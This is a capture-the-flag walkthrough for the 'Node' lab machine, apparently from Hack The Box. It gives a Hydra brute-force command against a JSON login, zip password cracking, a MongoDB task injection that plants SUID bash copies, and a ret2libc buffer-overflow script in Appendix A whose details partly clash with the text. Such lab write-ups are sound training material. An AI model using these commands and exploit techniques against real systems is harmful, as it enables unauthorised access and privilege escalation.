# Node

*Converted from: Node.pdf*

---

# Node

## **24 [th] October 2017 / Document No D17.100.31**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: rastating**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 9


## **SYNOPSIS**

Node focuses mainly on newer software and poor configurations. The machine starts out

seemingly easy, but gets progressively harder as more access is gained. In-depth enumeration is

required at several steps to be able to progress further into the machine.


## **Skills Required**


  - Intermediate/advanced knowledge of

Linux

  - Exploiting buffer overflows


## **Skills Learned**


  - Bypassing user agent filtering

  - Brute forcing JSON payloads

  - Exploiting buffer overflows

  - Bypassing ASLR and NX


Page 2 / 9


## **Enumeration** **Nmap**

Nmap reveals only two open services; OpenSSH and Node.js.



Page 3 / 9


## **Dirbuster**

Running Dirbuster (or most other web fuzzing tools) initially yield no results. However, after

tweaking the user agent, fuzzing reveals several directories.


Page 4 / 9


## **Exploitation** **Website**

While two accounts linked to from the home page can be brute forced, they are unprivileged and

do not aid with exploitation. Examining the source code for the home page reveals several

javascript files. The file **app.js** references the file **/partials/admin.html** which allows for download

of a backup with valid administrator permissions.


Intercepting requests to the profile page with Burp Suite (or simply reviewing all javascript files in

detail) reveals a user API at **/api/users/<username>** . Attempting to browse to **/api/users/** exposes

a list of all valid usernames as well as their hashes.


With a valid administrator username, it is now possible to brute force to gain access. The

requests must be sent in JSON format, so Burp Suite, Hydra or any other tool capable of JSON

formatted POST requests will work. Using Hydra and rockyou.txt, the administrator password is

quickly found. The following command properly escapes the JSON POST data.


**hydra -l myP14ceAdm1nAcc0uNT -P rockyou.txt 10.10.10.58 -s 3000 http-post-form**

**"/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication**

**failed:H=Content-Type\: application/json" -t 64**


Page 5 / 9


## **Myplace.backup**

Once logged in and the backup is downloaded, it is fairly obvious that the file is a single Base64

string. Using the command **base64 -d myplace.backup > backup.zip** will output a

password-protected ZIP file.


It is possible to crack the password using fcrackzip (or any other similar tool) and rockyou.txt. The

following command will discover the correct password almost immediately.


**fcrackzip -D -p ../../wordlists/rockyou.txt -u backup.zip**

## **SSH**


Once the contents of the ZIP file are extracted, obtaining a shell is trivial. Simply looking at the

connection string in **app.js** reveals valid SSH credentials for the user **mark** in the mongodb

connection string.


Page 6 / 9


## **Privilege Escalation** **Tom**

LinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)


Running LinEnum (or simply **ps aux** in this case) reveals a service running under the **tom** user,

which was created by the command **/usr/bin/node /var/scheduler/app.js** . Reviewing **app.js**

reveals that the credentials found previously are reused to connect to a MongoDB database

named **scheduler** .


Using the command **mongo -p -u mark scheduler** will grant command line access to MongoDB.

The following command will create a copy of bash and set SGID, and it will be owned by **tom** .


**db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod**

**g+s /tmp/tom; chmod u+s /tmp/tom"});**


Executing the binary with **/tmp/tom -p** will grant a bash shell as **tom** and will also be a part of the

**admin** group that is required to access a different SUID binary which was uncovered by LinEnum.


Page 7 / 9


## **Root**

Returning to the backup script at **/var/www/myplace/app.js**, it appears that the SUID binary at

**/user/local/bin/backup** is called with the arguments **/usr/local/bin/backup -q**

**45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474**

**/var/www/myplace** . Upon closer examination, the binary appears to hit a segmentation fault if

enough data is passed (508 bytes) for the third argument (path), and the **-q** (quiet mode) flag is

not set. ASLR and NX are enabled, so the binary must be exploited by going the ret2libc route.


  - Find libc address: **ldd /usr/local/bin/backup**

  - Find libc system function: **readelf -s /lib32/libc.so.6 | grep system**

  - Find libc exit function: **readelf -s /lib32/libc.so.6 | grep exit**

  - Find libc /bin/sh reference: **strings -a -t x /lib32/libc.so.6 | grep /bin/sh**


After the above information has been gathered, it is fairly straightforward to create a script to

handle exploitation. Refer to **node_bof.py (Appendix A)** for a functional example. The flags can

be obtained from **/home/tom/user.txt** and **/root/root.txt**


Page 8 / 9


## **Appendix A**

```
 import struct, subprocess

 libc = 0xf75e2000
 sysOffset = 0x0003a940
 sysAddress = libc + sysOffset
 exitOffset = 0x0002e7b0
 exitAddress = libc + exitOffset
 binsh = libc + 0x0015900b

 payload = "A" * 512
 payload += struct.pack("<I", sysAddress)
 payload += struct.pack("<I", exitAddress)
 payload += struct.pack("<I", binsh)

 attempts = 0

 while True:
   attempts += 1
   print "Attempts: " + attempts
   subprocess.call(["/usr/local/bin/backup", "-i",
 "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110",
 payload])
```

_node_bof.py_


Page 9 / 9


